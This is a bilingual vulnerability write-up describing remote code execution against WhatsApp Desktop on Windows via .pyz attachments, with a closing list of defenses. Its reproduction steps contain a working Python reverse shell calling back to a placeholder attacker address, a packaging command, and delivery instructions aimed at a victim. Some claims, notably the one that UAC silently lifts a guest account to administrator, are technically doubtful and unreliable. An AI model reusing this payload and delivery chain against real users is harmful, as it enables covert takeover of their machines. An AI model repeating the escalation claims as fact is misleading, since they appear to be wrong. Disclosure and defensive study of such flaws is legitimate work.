# Remote code execution in WhatsApp Desktop via `.pyz`

> Send the file. They double click it. You have a shell. Nothing in between asks anyone for permission.

## What is going on

A `.pyz` is just a zip archive with Python inside, and the Python interpreter runs it directly. No extraction, no install step, nothing that looks like an executable to a person glancing at the file name.

WhatsApp Desktop on Windows hands that file straight to the interpreter when the victim opens it from the chat. There is no warning, no "are you sure", no mark of the web. The script runs with the user's token, and from a guest profile it walks up to administrator on the way.

The interesting part is not the file format. It is that four separate defensive layers all decline to act, each for its own reason.

## Steps to reproduce

Write a script that calls back to you:

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker_ip", attacker_port))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
```

Note that this sample spawns `/bin/sh`. The target here is Windows, so in practice you swap that last line for the local shell.

Package it with `zipapp`:

```bash
python -m zipapp reverse_shell.py -o reverse_shell.pyz
```

Send the `.pyz` over WhatsApp, and wait for the victim to open it from the chat window. That is the whole chain.

## Why nothing stops it

### Windows Defender

Defender leans on file signatures to recognize known malware. When the `.pyz` arrives through WhatsApp it does not carry enough metadata for Defender to make a judgment, so the signature check never really happens. Real time protection does not intercept the execution either, because what actually launches is a trusted interpreter, not an unknown binary.

### UAC

UAC never prompts. The file inherits the security context WhatsApp is running in, and that context is treated as trusted, so the elevation goes through without the dialog that is supposed to gate it. This is the step that turns a guest account into an administrator.

### WhatsApp itself

There is no behavioral analysis before execution, no integrity check, no origin check. There is also no confirmation prompt, which means the victim gets no moment where they could reasonably stop and reconsider. From their point of view they opened an attachment.

### Antivirus

Signature scanning and real time monitoring both miss it for the same reason Defender does. Worse, the outbound connection the reverse shell opens is not blocked either, because the traffic originates from a process chain that started inside a trusted application. Deep packet inspection and network behavior analysis tend to give that chain the benefit of the doubt.

## Video demonstration

https://github.com/user-attachments/assets/f87fd925-1fa3-467a-8815-e96800562b63

## Why it matters

Full control of the victim's machine, from a single attachment, with no security system raising a hand at any point. Privilege escalation comes along for free, so the blast radius is not limited to whatever the victim's own account could reach.

## How to defend against it

* Treat `.pyz` like any other executable attachment and apply mark of the web to files written out of the chat
* Prompt before handing an attachment to an external interpreter, the same way you would before running an `.exe`
* Do not let a messaging client's security context be inherited by processes it spawns
* On the endpoint side, alert on interpreters spawned by messaging clients, and on outbound sockets opened by those children

---

<details>
<summary><strong>🇧🇷 Versão em português</strong></summary>

<br>

## O que está acontecendo

Um `.pyz` é só um arquivo zip com Python dentro, e o interpretador Python executa ele direto. Sem descompactar, sem instalar, sem nada que pareça um executável para quem bate o olho no nome do arquivo.

O WhatsApp Desktop no Windows entrega esse arquivo direto para o interpretador quando a vítima abre pela conversa. Não tem aviso, não tem "tem certeza", não tem mark of the web. O script roda com o token do usuário, e a partir de um perfil convidado ele sobe para administrador no caminho.

A parte interessante não é o formato do arquivo. É que quatro camadas de defesa distintas se recusam a agir, cada uma pelo seu próprio motivo.

## Passos para reproduzir

Escreva um script que chame de volta para você, empacote com `zipapp`:

```bash
python -m zipapp reverse_shell.py -o reverse_shell.pyz
```

Envie o `.pyz` pelo WhatsApp e espere a vítima abrir pela janela da conversa. Essa é a cadeia inteira.

## Por que nada impede

### Windows Defender

O Defender se apoia em assinaturas de arquivo para reconhecer malware conhecido. Quando o `.pyz` chega pelo WhatsApp, ele não carrega metadados suficientes para o Defender formar um juízo, então a verificação de assinatura nunca acontece de verdade. A proteção em tempo real também não intercepta a execução, porque o que de fato é lançado é um interpretador confiável, não um binário desconhecido.

### UAC

O UAC nunca pergunta nada. O arquivo herda o contexto de segurança em que o WhatsApp está rodando, e esse contexto é tratado como confiável, então a elevação passa sem o diálogo que deveria barrá-la. É esse passo que transforma uma conta convidada em administrador.

### O próprio WhatsApp

Não há análise de comportamento antes da execução, nem verificação de integridade, nem de origem. Também não há prompt de confirmação, o que significa que a vítima não ganha nenhum momento em que poderia razoavelmente parar e repensar. Do ponto de vista dela, ela abriu um anexo.

### Antivírus

Varredura por assinatura e monitoramento em tempo real erram pelo mesmo motivo que o Defender erra. Pior: a conexão de saída que o reverse shell abre também não é bloqueada, porque o tráfego se origina de uma cadeia de processos que começou dentro de uma aplicação confiável. Inspeção profunda de pacotes e análise de comportamento de rede tendem a dar a essa cadeia o benefício da dúvida.

## Por que isso importa

Controle total da máquina da vítima, a partir de um único anexo, sem nenhum sistema de segurança levantar a mão em momento algum. A elevação de privilégio vem de brinde, então o raio de alcance não fica limitado ao que a conta da vítima sozinha conseguiria acessar.

## Como se defender

* Trate `.pyz` como qualquer outro anexo executável e aplique mark of the web em arquivos gravados a partir da conversa
* Peça confirmação antes de entregar um anexo a um interpretador externo, do mesmo jeito que você pediria antes de rodar um `.exe`
* Não deixe o contexto de segurança do cliente de mensagens ser herdado pelos processos que ele cria
* No endpoint, alerte sobre interpretadores criados por clientes de mensagens, e sobre sockets de saída abertos por esses filhos

</details>

---

<sub>Publicado para fins educacionais, conscientização defensiva e testes de segurança autorizados.</sub>
